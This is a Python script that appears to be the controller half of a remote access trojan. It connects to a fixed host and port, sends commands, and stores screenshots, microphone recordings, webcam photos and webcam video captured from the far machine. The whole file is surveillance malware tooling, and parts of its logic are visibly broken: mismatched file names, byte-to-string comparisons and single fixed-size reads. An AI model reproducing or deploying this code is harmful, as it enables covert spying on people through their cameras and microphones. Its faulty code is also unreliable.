import socket
import os
import time
s = socket.socket()
SERVER_HOST = "192.168.1.7"
SERVER_PORT = 5003
BUFFER_SIZE = 1024

s = socket.socket()

# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))
print(f"Connected to {SERVER_HOST}:{SERVER_PORT}\nCommand: ")
print("Severe request to please type dir 2 times after any complex command")
message = input('=>')
	
while message != 'quit':
	s.send(message.encode())
	
	data = s.recv(2024).decode()
	
		
	while str(data) == 'capturing':
		
		f = open('new'+message+'.png' , 'wb')	
		img = s.recv(2024)
		f.write(img)

		f.close()
		os.remove("newscreenshot.png")
		data = 	input('=>')
		s.send(data.encode())
		data = s.recv(2024)

	while str(data) == 'capturing video':
		
		f = open('new'+message+'.wav' , 'wb')	
		img = s.recv(2024)
		f.write(img)
	

		f.close()
		os.remove("newvoice-record.wav")
		data = 	input("=>")
		s.send(data.encode())
		data = s.recv(2024)


	while str(data) == 'capturing webcam':
		
		f = open('new'+message+'.jpg' , 'wb')	
		img = s.recv(2024)
		f.write(img)
	

		f.close()
		os.remove("newwebcam.jpg")
		data = 	input("=>")
		s.send(data.encode())
		data = s.recv(2024)	

	while str(data) == 'capturing audiovideo':
		
		f = open('new'+message+'.avi' , 'wb')	
		img = s.recv(2024)
		f.write(img)
	

		f.close()
		os.remove("newwebcam video.avi")
		data = 	input("=>")
		s.send(data.encode())
		data = s.recv(2024)

	while str(data) == 'capturing audiovideovillen':
			#while str(data) == 'typeput':
			#	imtype=input("Enter file name")
			#	s.send(data.encode()
			#	#data = s.recv(2024)			
		f = open('new'+message+'.mp4' , 'wb')	
		img = s.recv(2024)
		f.write(img)
	
		
		f.close()
		os.remove("newwebcam video --villen.mp4")
		os.remove("outputvideovillen.avi")
		data = 	input("=>")
		s.send(data.encode())
		data = s.recv(2024)



	while str(data) == 'irritating':
		print("irritating")
		data = 	input("=>")
		s.send(data.encode())
		data = s.recv(2024)
		
	print (str(data ))
	message = input("=>")
s.close()